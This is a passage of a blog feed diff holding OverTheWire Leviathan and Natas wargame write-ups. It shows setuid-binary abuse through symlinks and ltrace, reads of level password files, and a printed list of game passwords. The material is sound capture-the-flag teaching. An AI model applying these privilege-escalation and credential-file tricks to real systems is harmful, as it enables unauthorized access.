+system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/cat /tmp/zd3l/password plz.&quot;&lt;/span&gt;.../bin/cat: /tmp/zd3l/password: No such file or directory
+/bin/cat: plz.txt: No such file or directory
+ &amp;lt;no &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; ...&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; SIGCHLD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Child exited&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&amp;lt;... system resumed&amp;gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 256
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;mkay-so-its-only-accepting-the-first-word-out-of-the-two--some-googling-later--httpsman7orglinuxman-pagesman1ln1html&quot;&gt;Mkay, so it’s only accepting the first word out of the two. -Some googling later- (https://man7.org/linux/man-pages/man1/ln.1.html)&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan2@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/zd3l
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;pass&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;word.txt
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /etc/leviathan_pass/leviathan3 /tmp/zd3l/pass
+leviathan2@leviathan:/tmp/zd3l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;~/printfile &lt;span class=&quot;s2&quot;&gt;&quot;pass word.txt&quot;&lt;/span&gt;
+Ahdiemoo1j
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cant-explain-it-in-human-words-but-i-get-it&quot;&gt;Can’t explain it in human words. But I get it.&lt;/h2&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ahdiemoo1j 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Leviathan 2 ```</summary></entry><entry><title type="html">Overthewire Leviathan Level 1 To 2</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-1-to-2.html" rel="alternate" type="text/html" title="Overthewire Leviathan Level 1 To 2" /><published>2021-04-17T10:40:00+01:00</published><updated>2021-04-17T10:40:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-1-to-2</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/17/OverTheWire-Leviathan-Level-1-to-2.html">&lt;h1 id=&quot;leviathan-1&quot;&gt;Leviathan 1&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+Username: leviathan1
+Password: rioGegei8m
+
+Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lets-take-a-look&quot;&gt;Lets take a look&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;check
+leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file ./check
+./check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;okay-lets-run-this&quot;&gt;Okay, lets run this..&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./check
+password: hello
+Wrong password, Good Bye ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;okay-what-did-we-learn-from-rabit-lets-check-some-strings&quot;&gt;Okay, what did we learn from Rabit? Lets check some strings&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings ./check
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+puts
+setreuid
+&lt;span class=&quot;nb&quot;&gt;printf
+&lt;/span&gt;getchar
+system
+geteuid
+strcmp
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRhp
+QVh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+secrf
+love
+UWVS
+t&lt;span class=&quot;nv&quot;&gt;$,&lt;/span&gt;U
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;^_]
+password:
+/bin/sh
+Wrong password, Good Bye ...
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2&lt;span class=&quot;s2&quot;&gt;$&quot;
+GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.6587
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+check.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strcmp@@GLIBC_2.0
+__x86.get_pc_thunk.bx
+printf@@GLIBC_2.0
+getchar@@GLIBC_2.0
+_edata
+geteuid@@GLIBC_2.0
+__data_start
+puts@@GLIBC_2.0
+system@@GLIBC_2.0
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+setreuid@@GLIBC_2.0
+__libc_start_main@@GLIBC_2.0
+__libc_csu_init
+_fp_hw
+__bss_start
+main
+__TMC_END__
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;love-what-does-love-do&quot;&gt;Love? What does love do?&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./check
+password: love
+Wrong password, Good Bye ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;nothing--an-eternity-later--i-discoverd-ltrace&quot;&gt;Nothing. -An eternity later- I discoverd ltrace.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace ./check
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x804853b, 1, 0xffffd794, 0x8048610 &amp;lt;unfinished ...&amp;gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 10
+getchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1, 0, 0x65766f6c, 0x646f6700password: hello
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 104
+getchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1, 0, 0x65766f6c, 0x646f6700&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 101
+getchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1, 0, 0x65766f6c, 0x646f6700&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 108
+strcmp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;hel&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;sex&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
+puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Wrong password, Good Bye ...&quot;&lt;/span&gt;Wrong password, Good Bye ...
+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 29
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;so-sex-love-secret-and-sex-did-hackers-teach-me-nothing&quot;&gt;So.. Sex. Love, Secret and Sex. Did Hackers teach me nothing?&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan1@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./check
+password: sex
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ../../etc/leviathan_pass/leviathan2
+ougahZi8Ta
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ougahZi8Ta 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Leviathan 1 ```</summary></entry><entry><title type="html">Overthewire Leviathan Level 0 To 1</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Level-0-to-1.html" rel="alternate" type="text/html" title="Overthewire Leviathan Level 0 To 1" /><published>2021-04-15T10:20:00+01:00</published><updated>2021-04-15T10:20:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Level-0-to-1</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Level-0-to-1.html">&lt;h1 id=&quot;leviathan---what-is-it&quot;&gt;Leviathan - What is it?&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;### Dare you face the lord of the oceans?
+
+Leviathan is a wargame that has been rescued from the demise of **intruded.net**, previously hosted on leviathan.intruded.net. **Big thanks to adc, morla and reth** for their help in resurrecting this game!
+
+What follows below is the original description of leviathan, copied from intruded.net:
+
+
+Summary:
+Difficulty:     1/10
+Levels:         8
+Platform:   Linux/x86
+
+Author:
+Anders Tonfeldt
+
+Special Thanks:
+We would like to thank AstroMonk for coming up with a replacement idea for the last level,
+deadfood for finding a leveljump and Coi for finding a non-planned vulnerability.
+
+Description:
+This wargame doesn&apos;t require any knowledge about programming - just a bit of common
+sense and some knowledge about basic *nix commands. We had no idea that it&apos;d be this
+hard to make an interesting wargame that wouldn&apos;t require programming abilities from 
+the players. Hopefully we made an interesting challenge for the new ones.
+
+
+Leviathan’s levels are called **leviathan0, leviathan1, … etc.** and can be accessed on **leviathan.labs.overthewire.org** through SSH on port 2223.
+
+To login to the first level use:
+
+
+Username: leviathan0
+Password: leviathan0
+
+
+Data for the levels can be found in **the homedirectories**. You can look at **/etc/leviathan\_pass** for the various level passwords.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;level-0&quot;&gt;Level 0&lt;/h1&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas0
-Password: natas0
+
+&lt;h2 id=&quot;greppy-time&quot;&gt;Greppy time.&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leviathan0@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 24
+drwxr-xr-x  3 root       root       4096 Aug 26  2019 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
+drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root        220 May 15  2017 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root       3526 May 15  2017 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root       root        675 May 15  2017 .profile
+leviathan0@leviathan:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .backup
+leviathan0@leviathan:~/.backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;bookmarks.html
+leviathan0@leviathan:~/.backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;bookmarks.html | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;leviathan1
+&amp;lt;DT&amp;gt;&amp;lt;A &lt;span class=&quot;nv&quot;&gt;HREF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ADD_DATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1155384634&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;LAST_CHARSET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rdf:#&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$2wIU71&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;password to leviathan1&amp;lt;/A&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;VICTORY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rioGegei8m 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Leviathan - What is it? ``` Dare you face the lord of the oceans?</summary></entry><entry><title type="html">Overthewire Leviathan Passwords</title><link href="http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Passwords.html" rel="alternate" type="text/html" title="Overthewire Leviathan Passwords" /><published>2021-04-15T10:00:00+01:00</published><updated>2021-04-15T10:00:00+01:00</updated><id>http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Passwords</id><content type="html" xml:base="http://localhost:4000/overthewire/leviathan/2021/04/15/OverTheWire-Leviathan-Passwords.html">&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Level 1: rioGegei8m
+Level 2: ougahZi8Ta
+Level 3: Ahdiemoo1j
+Level 4: vuH0coox6m
+Level 5: Tith4cokei
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="OverTheWire" /><category term="Leviathan" /><summary type="html">Level 1: rioGegei8m Level 2: ougahZi8Ta Level 3: Ahdiemoo1j Level 4: vuH0coox6m Level 5: Tith4cokei</summary></entry><entry><title type="html">Overthewire Natas Level 10 To 11</title><link href="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-10-to-11.html" rel="alternate" type="text/html" title="Overthewire Natas Level 10 To 11" /><published>2021-04-11T10:50:00+01:00</published><updated>2021-04-11T10:50:00+01:00</updated><id>http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-10-to-11</id><content type="html" xml:base="http://localhost:4000/overthewire/natas/2021/04/11/OverTheWire-Natas-Level-10-to-11.html">&lt;h1 id=&quot;level-11&quot;&gt;Level 11&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Username: natas11
+Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+URL:      http://natas11.natas.labs.overthewire.org
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;as-normal-lets-look-at-various-sources&quot;&gt;As normal, lets look at various sources&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;okay-im-going-to-look-at-the-source-for-this-one-this-looks-interesting&quot;&gt;Okay.. I’m going to look at the source for this one, this looks interesting.&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;  
+  
+&lt;span class=&quot;nv&quot;&gt;$defaultdata&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;showpassword&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bgcolor&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;#ffffff&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;xor_encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;censored&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$outText&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+  
+ &lt;span class=&quot;c1&quot;&gt;// Iterate through each character  &lt;/span&gt;
+ &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$outText&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;  
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+ &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$outText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;  
+  
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$def&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+ &lt;span class=&quot;nv&quot;&gt;$mydata&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$def&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+ &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  
